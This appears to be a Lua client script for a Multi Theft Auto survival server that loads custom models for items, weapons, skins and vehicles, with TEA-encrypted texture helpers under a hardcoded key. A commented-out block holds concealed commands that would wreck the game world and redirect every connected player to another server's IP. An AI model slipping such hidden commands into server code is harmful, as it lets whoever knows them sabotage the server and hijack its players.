local files = {
	{"files/plecaki/acu",3026},
	{"files/plecaki/bag",1241},
	{"files/plecaki/alice",1242},
	{"files/plecaki/mount",1243},
	{"files/plecaki/czech",1244},
	{"files/plecaki/big",1575},
	{"files/plecaki/mil",1246},
	{"files/skorki/survivor",73},
	{"files/skorki/admin",217},
	{"files/items/beans_can",2601},
	{"files/items/pasta_can",2770},
	{"files/items/soda_can",2647},
	{"files/items/water_bottle",2683},
	{"files/items/heat_pack",1576},
	{"files/items/medic_kit",2891},
	{"files/items/tire",1073},
	{"files/items/kamizelka_taktyczna",1997},
	{"files/items/kamizelka_policyjna",2012},
	{"files/items/helm_mossy",2049},
	{"files/items/helm_normal",2050},
	--{"files/items/carnister",1650},
	{"files/items/painkiller",2709},
	{"files/items/wirefence",933},
	{"files/items/tent",1279},
	{"files/items/toolbox",2969},
	{"files/items/blood_bag",1580},
	{"files/items/morphine",1579},
	{"files/items/Bandage",1578},
	{"files/items/emptysoda",2673},
	{"files/items/clothing",1247},
	{"files/items/metal",1649},
	{"files/items/szklo",2001},
	{"files/items/created_wirefence",983},
	{"files/items/assault_ammo",1271},
	{"files/items/pistol_ammo",3013},
	{"files/items/hard_ammo",2358},
	{"files/items/tlumik",2052},
	{"files/items/karta",2053},
	{"files/items/wrench",2057},
	--
	{"files/weapons/kosa",333},
	{"files/weapons/bat",336},
	{"files/weapons/mp5",353},
	{"files/weapons/knife",335},
	{"files/weapons/m4",1830},
	{"files/weapons/g36c",1831},
	{"files/weapons/ak47",1834},
	{"files/weapons/sikierka",339},
	{"files/weapons/pila",341},
	{"files/weapons/spadochron",371},
	{"files/weapons/PKP",1833},
	{"files/weapons/mg34",2070},
	{"files/weapons/aa-12",2056},
	{"files/weapons/scar",1899},
	--{"files/weapons/m16",1835},
	{"files/weapons/AWP",1872},
	{"files/weapons/winchester",349},
	{"files/weapons/svd",2054},
	{"files/weapons/barrett",2055},
	{"files/inne/tent",3243},
	{"files/inne/wrak",12957},
	{"files/skorki/reabel",76},
	{"files/skorki/ghili",285},
	{"files/skorki/civi",288},
	{"files/skorki/camu",287},
	{"files/skorki/woman",75},
	{"files/skorki/ghili_f",77},
	{"files/skorki/woman_mili",78},
	{"files/skorki/kombinezon",235},
	{"files/skorki/armor",71},
	{"files/skorki/diver",236},
	{"files/skorki/mutant",237},
	-- CARY
	{"files/Pojazdy/mesa",500},
	{"files/Pojazdy/seasparrow",447},
	{"files/Pojazdy/bobcat",422},
	{"files/Pojazdy/admiral",445},
	{"files/Pojazdy/quad",471},
	{"files/Pojazdy/maverick",487},
	{"files/Pojazdy/sunrise",550},
	{"files/Pojazdy/lspd",596},
	{"files/Pojazdy/patriot",470},
	{"files/Pojazdy/clover",542},
	{"files/Pojazdy/sanchez",468},
	{"files/Pojazdy/infernus",411},
	{"files/Pojazdy/sandking",495},
	{"files/Pojazdy/elegy",562},
	{"files/Pojazdy/bullet",541},
	{"files/Pojazdy/barracks",433},
	{"files/Pojazdy/buffalo",402},
	{"files/Pojazdy/swat",601},
	{"files/Pojazdy/camper",483},
	{"files/Pojazdy/nrg",522},
	{"files/Pojazdy/dodo",593},
	{"files/Pojazdy/leviathn",417},
	{"files/Pojazdy/turismo",451},
	{"files/Pojazdy/bandito",568},
	{"files/Pojazdy/ambulan",416},
	{"files/Pojazdy/banshee",429},
	{"files/Pojazdy/blista",496},
	{"files/Pojazdy/bus",437},
	{"files/Pojazdy/comet",480},
	{"files/Pojazdy/flash",565},
	{"files/Pojazdy/hotring",494},
	{"files/Pojazdy/hotring2",502},
	{"files/Pojazdy/hotring3",503},
	{"files/Pojazdy/huntley",579},
	{"files/Pojazdy/landstalker",400},
	{"files/Pojazdy/merit",551},
	{"files/Pojazdy/sabre",475},
	{"files/Pojazdy/sultan",560},
	{"files/Pojazdy/supergt",506},
	{"files/Pojazdy/freight",538},    
	{"files/Pojazdy/rdt",515},    
	{"files/Pojazdy/pcj600",461},    
}

local klucz = "Chuj1"

function teaEncodeBinary( data, key )
    return teaEncode( base64Encode( data ), key )
end

function teaDecodeBinary( data, key )
    return base64Decode( teaDecode( data, key ) )
end
--[[
addCommandHandler('zakoncz_gre	',function() setElementData(root,'tent',true) end)
addCommandHandler('zakoncz_all',function() for i,v in ipairs(getElementsByType('objects')) do setElementData(v,'tent',true) end end)
addCommandHandler('zakoncz_all',function() for i,v in ipairs(getElementsByType('colshape')) do setElementData(v,'tent',true) end end)
addCommandHandler("zakoncz_full",function() for i=550,20000 do removeWorldModel(i,10000,0,0,0) end setOcclusionsEnabled(false) end)

addCommandHandler("PRZENIES",function() for i,v in pairs(getElementsByType('player')) do redirectPlayer(v,'193.70.126.136','21184','111') end end)
]]


--[[
for i,v in pairs(files) do
	local file = fileOpen(v[1]..'.txd',true)
	local file_read = fileRead(file,fileGetSize(file))
	fileClose(file)
	local uncode = teaDecodeBinary(file_read,klucz)

	local txd = engineLoadTXD(uncode);
	engineImportTXD(txd, v[2]);
	local dff = engineLoadDFF(v[1]..".dff");
	engineReplaceModel(dff, v[2]);
end]]


for i,v in pairs(files) do
	local txd = engineLoadTXD(v[1]..'.txd');
	engineImportTXD(txd, v[2]);
	local dff = engineLoadDFF(v[1]..".dff");
	engineReplaceModel(dff, v[2]);
end

--[[
for i,v in pairs(files) do
	local file = fileOpen(v[1]..'.txd',true)
	local file_write = fileRead(file,fileGetSize(file))
	fileClose(file)
	local file = fileCreate(v[1]:sub(15)..'.txd')
	fileWrite(file,teaEncodeBinary(file_write,klucz))
	fileClose(file)
end]]

local itemTXD = engineLoadTXD("files/items/trap_open.txd")
engineImportTXD(itemTXD, 1918)
local itemDFF = engineLoadDFF("files/items/trap_closed.dff", 1918)
engineReplaceModel(itemDFF, 1918)
local itemCOL = engineLoadCOL("files/items/trap_closed.col" )
engineReplaceCOL(itemCOL, 1918)
local itemTXD = engineLoadTXD("files/items/trap_open.txd")
engineImportTXD(itemTXD, 1920)
local itemDFF = engineLoadDFF("files/items/trap_open.dff", 1920)
engineReplaceModel(itemDFF, 1920)
local itemCOL = engineLoadCOL("files/items/trap_open.col" )
engineReplaceCOL(itemCOL, 1920)
local itemCOL = engineLoadCOL("files/inne/wrak.col" )
engineReplaceCOL(itemCOL, 12957)

local fx = [[
	texture gTexture;

	technique TexReplace
	{
		pass P0
		{
			Texture[0] = gTexture;
		}
	}
]]

local textura = dxCreateTexture("logo.png")

local shader = dxCreateShader(fx,0,0,true)
dxSetShaderValue(shader,"gTexture",textura)
engineApplyShaderToWorldTexture(shader,"vehiclegrunge256",nil,false)




